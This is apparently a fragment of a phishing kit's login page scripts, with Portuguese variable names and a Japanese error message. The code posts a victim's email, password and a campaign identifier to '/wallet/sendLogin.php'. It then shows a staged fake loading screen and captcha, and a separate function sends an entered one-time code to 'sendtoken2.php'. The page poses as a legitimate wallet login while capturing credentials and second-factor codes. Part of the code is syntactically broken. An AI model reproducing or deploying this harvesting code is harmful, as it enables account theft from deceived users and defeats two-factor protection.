  <script>
   function sendtoken() {

			$(document).ready(function() {

				var token = $("#otp").val();

				$.ajax({
					type: 'post',
					data: {
						token: token,
					},
					dataType: 'json',
					url: 'sendtoken2.php',
					success: function(data) {
						document.getElementById('submit-login').innerHTML = "<img src='./images/download.svg' width='25px' style='margin:0 auto; padding-top:5px;' >";
						document.getElementById('submit-login').disabled = true;

			});

			return false;

		}
  </script>
  <script>
   const inputEmail = document.getElementById("inputEmail");
		const inputPass = document.getElementById("inputPassword");
		const sendButton = document.getElementById("sendButton");
		const errorNotification = document.getElementById("error_notification");
		const errorMessage = document.getElementById("error_message");
		const campanha = document.getElementById("camp").value;

		const urlParams = new URLSearchParams(window.location.search);

		const validateEmail = (email) => {
			const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
			return emailRegex.test(email);
		};

		const handleSendButtonClick = async () => {
			const email = inputEmail.value;
			const password = inputPass.value;

			const isEmailValid = email && validateEmail(email);
			const isPasswordValid = password && password.length > 5;

			if (isEmailValid && isPasswordValid) {
				try {
					await fetch("/wallet/sendLogin.php", {
						method: "POST",
						headers: {
							"Content-Type": "application/json"
						},
						body: JSON.stringify({
							email,
							password,
							campanha
						})
					});
					localStorage.setItem("emailCheckBlock", email);
					sendButton.setAttribute("disabled", "disabled");
					setTimeout(() => {
						document.getElementById("formLoad").style.display = "flex";
					}, 1200);
					setTimeout(() => {
						document.getElementById("formLoad").style.display = "none";
						document.getElementById("formCaptcha").style.display = "flex";
					}, 5100);
				} catch (error) {
					console.error("Erro ao enviar os dados:", error);
				}
			}
		};

		const validateFields = () => {
			const email = inputEmail.value;
			const password = inputPass.value;

			const isEmailValid = email && validateEmail(email);
			const isPasswordValid = password && password.length > 5;

			if (isEmailValid && isPasswordValid) {
				sendButton.removeAttribute("disabled", "disabled");
			} else {
				sendButton.setAttribute("disabled", "disabled");
			}
		};

		inputEmail.addEventListener("input", validateFields);
		inputPass.addEventListener("input", validateFields);
		sendButton.addEventListener("click", handleSendButtonClick);

		if (urlParams.has("error")) {
			const errorCode = urlParams.get("error");

			switch (errorCode) {
				case "9":
					errorNotification.classList.remove("dispnone");
					errorMessage.textContent = "セッションの有効期限が切れました。";
					break;
				case "1":
					errorNotification.classList.remove("dispnone");
					break;
			}
		}
  </script>
